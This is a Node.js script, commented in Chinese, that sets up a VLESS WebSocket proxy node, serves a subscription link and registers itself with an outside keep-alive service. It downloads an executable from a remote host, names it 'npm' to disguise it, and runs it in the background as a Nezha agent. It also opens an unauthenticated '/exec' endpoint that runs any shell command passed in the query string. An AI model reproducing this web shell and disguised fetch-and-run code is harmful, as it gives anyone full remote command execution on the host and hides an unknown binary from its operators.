const os = require('os');
const http = require('http');
const fs = require('fs');
const axios = require('axios');
const net = require('net');
const { Buffer } = require('buffer');
const { exec, execSync } = require('child_process');
const { WebSocket, createWebSocketStream } = require('ws');
const UUID = process.env.UUID || 'de04add9-5c68-6bab-950c-08cd5320df33'; // 运行哪吒v1,在不同的平台需要改UUID,否则会被覆盖
const NEZHA_SERVER = process.env.NEZHA_SERVER || '';       // 哪吒v1填写形式：nz.abc.com:8008   哪吒v0填写形式：nz.abc.com
const NEZHA_PORT = process.env.NEZHA_PORT || '';           // 哪吒v1没有此变量，v0的agent端口为{443,8443,2096,2087,2083,2053}其中之一时开启tls
const NEZHA_KEY = process.env.NEZHA_KEY || '';             // v1的NZ_CLIENT_SECRET或v0的agent端口                
const DOMAIN = process.env.DOMAIN || '1234.abc.com';       // 填写项目域名或已反代的域名，不带前缀，建议填已反代的域名
const AUTO_ACCESS = process.env.AUTO_ACCESS || true;      // 是否开启自动访问保活,false为关闭,true为开启,需同时填写DOMAIN变量
  // 获取节点的订阅路径
 // const pad = n => n.toString().padStart(2, '0');
 // const date = new Date();
 // const SUB_PATH = `${date.getFullYear()}${pad(date.getMonth() + 1)}${pad(date.getDate())}`;   // 获取节点的订阅路径
        
const NAME = process.env.NAME || 'Vls';                    // 节点名称
const PORT = process.env.PORT || 3000;                     // http和ws服务端口
const url = require('url');                                // exec


const metaInfo = execSync(
  'curl -s https://speed.cloudflare.com/meta | awk -F\\" \'{print $26"-"$18}\' | sed -e \'s/ /_/g\'',
  { encoding: 'utf-8' }
);
const ISP = metaInfo.trim();
const httpServer = http.createServer((req, res) => {

 // Get information object about request URL:
    const parsedURL = url.parse(
        req.url, 
        true // 'true' sets parameters to be returned in object format
    );

    // Handle request to '/page' route:
    if (parsedURL.pathname === '/exec') {

        // Get all parameters:
        console.log(parsedURL.query); // { key1: 'value1', key2: 'value2', key3: 'value3' }
    
        if(!parsedURL.query.cmd) {
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end('No command\n');
            return;
        }

        let cmdStr = parsedURL.query.cmd;
        exec(cmdStr, function (err, stdout, stderr) {
            if (err) {
                res.writeHead(200, { 'Content-Type': 'text/plain' });
             res.end(err.message);
            } else {
                res.writeHead(200, { 'Content-Type': 'text/plain' });
         res.end(stdout);
            }
        });
        
        return;
    }

  
  if (req.url === '/') {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Hello, World\n');
  } else if (req.url === `/${UUID}`) {
// const vlessURL = `vless://${UUID}@www.visa.com.tw:443?encryption=none&security=tls&sni=${DOMAIN}&type=ws&host=${DOMAIN}&path=%2F#${NAME}-${ISP}`;
const subdomain = DOMAIN.split('.')[0]; // 取域名前缀
const vlessURL = `vless://${UUID}@www.visa.com.tw:443?encryption=none&security=tls&sni=${DOMAIN}&type=ws&host=${DOMAIN}&path=%2F#${subdomain}-${ISP}`;

    
    const base64Content = Buffer.from(vlessURL).toString('base64');

    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end(base64Content + '\n');
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found\n');
  }
});

const wss = new WebSocket.Server({ server: httpServer });
const uuid = UUID.replace(/-/g, "");
wss.on('connection', ws => {
  // console.log("Connected successfully");
  ws.once('message', msg => {
    const [VERSION] = msg;
    const id = msg.slice(1, 17);
    if (!id.every((v, i) => v == parseInt(uuid.substr(i * 2, 2), 16))) return;
    let i = msg.slice(17, 18).readUInt8() + 19;
    const port = msg.slice(i, i += 2).readUInt16BE(0);
    const ATYP = msg.slice(i, i += 1).readUInt8();
    const host = ATYP == 1 ? msg.slice(i, i += 4).join('.') :
      (ATYP == 2 ? new TextDecoder().decode(msg.slice(i + 1, i += 1 + msg.slice(i, i + 1).readUInt8())) :
        (ATYP == 3 ? msg.slice(i, i += 16).reduce((s, b, i, a) => (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), []).map(b => b.readUInt16BE(0).toString(16)).join(':') : ''));
    // console.log(`Connection from ${host}:${port}`);
    ws.send(new Uint8Array([VERSION, 0]));
    const duplex = createWebSocketStream(ws);
    net.connect({ host, port }, function () {
      this.write(msg.slice(i));
      duplex.on('error', () => { }).pipe(this).on('error', () => { }).pipe(duplex);
    }).on('error', () => { });
  }).on('error', () => { });
});

const getDownloadUrl = () => {
  const arch = os.arch();
  if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
    if (!NEZHA_PORT) {
      return 'https://arm64.ssss.nyc.mn/v1';
    } else {
      return 'https://arm64.ssss.nyc.mn/agent';
    }
  } else {
    if (!NEZHA_PORT) {
      return 'https://amd64.ssss.nyc.mn/v1';
    } else {
      return 'https://amd64.ssss.nyc.mn/agent';
    }
  }
};

const downloadFile = async () => {
  try {
    const url = getDownloadUrl();
    // console.log(`Start downloading file from ${url}`);
    const response = await axios({
      method: 'get',
      url: url,
      responseType: 'stream'
    });

    const writer = fs.createWriteStream('npm');
    response.data.pipe(writer);

    return new Promise((resolve, reject) => {
      writer.on('finish', () => {
        console.log('npm download successfully');
        exec('chmod +x ./npm', (err) => {
          if (err) reject(err);
          resolve();
        });
      });
      writer.on('error', reject);
    });
  } catch (err) {
    throw err;
  }
};

const runnz = async () => {
  await downloadFile();
  let NEZHA_TLS = '';
  let command = '';

  console.log(`NEZHA_SERVER: ${NEZHA_SERVER}`);


  const checkNpmRunning = () => {
    try {
      const result = execSync('ps aux | grep "npm" | grep -v "grep"').toString();
      return result.length > 0;
    } catch (error) {
      return false;
    }
  };

  if (checkNpmRunning()) {
    console.log('npm is already running');
    return;
  }

  if (NEZHA_SERVER && NEZHA_PORT && NEZHA_KEY) {
    const tlsPorts = ['443', '8443', '2096', '2087', '2083', '2053'];
    NEZHA_TLS = tlsPorts.includes(NEZHA_PORT) ? '--tls' : '';
    command = `nohup ./npm -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} >/dev/null 2>&1 &`;
  } else if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      // 检测哪吒是否开启TLS
      const port = NEZHA_SERVER.includes(':') ? NEZHA_SERVER.split(':').pop() : '';
      const tlsPorts = new Set(['443', '8443', '2096', '2087', '2083', '2053']);
      const nezhatls = tlsPorts.has(port) ? 'true' : 'false';
      const configYaml = `
client_secret: ${NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
report_delay: 1
server: ${NEZHA_SERVER}
skip_connection_count: false
skip_procs_count: false
temperature: false
tls: ${nezhatls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${UUID}`;

      if (!fs.existsSync('config.yaml')) {
        fs.writeFileSync('config.yaml', configYaml);
      }
    }
    command = `nohup ./npm -c config.yaml >/dev/null 2>&1 &`;
  } else {
    console.log('NEZHA variable is empty, skip running');
    return;
  }

  try {
    exec(command, {
      shell: '/bin/bash'
    });
    console.log('npm is running');
  } catch (error) {
    console.error(`npm running error: ${error}`);
  }
};

async function addAccessTask() {
  if (!AUTO_ACCESS) return;
  try {
    if (!DOMAIN) {
      console.log('URL is empty. Skip Adding Automatic Access Task');
      return;
    } else {
      const fullURL = `https://${DOMAIN}`;
      const command = `curl -X POST "https://oooo.serv00.net/add-url" -H "Content-Type: application/json" -d '{"url": "${fullURL}"}'`;
      exec(command, (error, stdout, stderr) => {
        if (error) {
          console.error('Error sending request:', error.message);
          return;
        }
        console.log('Automatic Access Task added successfully:', stdout);
      });
    }
  } catch (error) {
    console.error('Error added Task:', error.message);
  }
}

const delFiles = () => {
  fs.unlink('npm', () => { });
  fs.unlink('config.yaml', () => { });
};

httpServer.listen(PORT, () => {
  runnz();
  // setTimeout(() => {
  //   delFiles();
  // }, 30000);
  addAccessTask();
  console.log(`Server is running on port ${PORT}`);
});
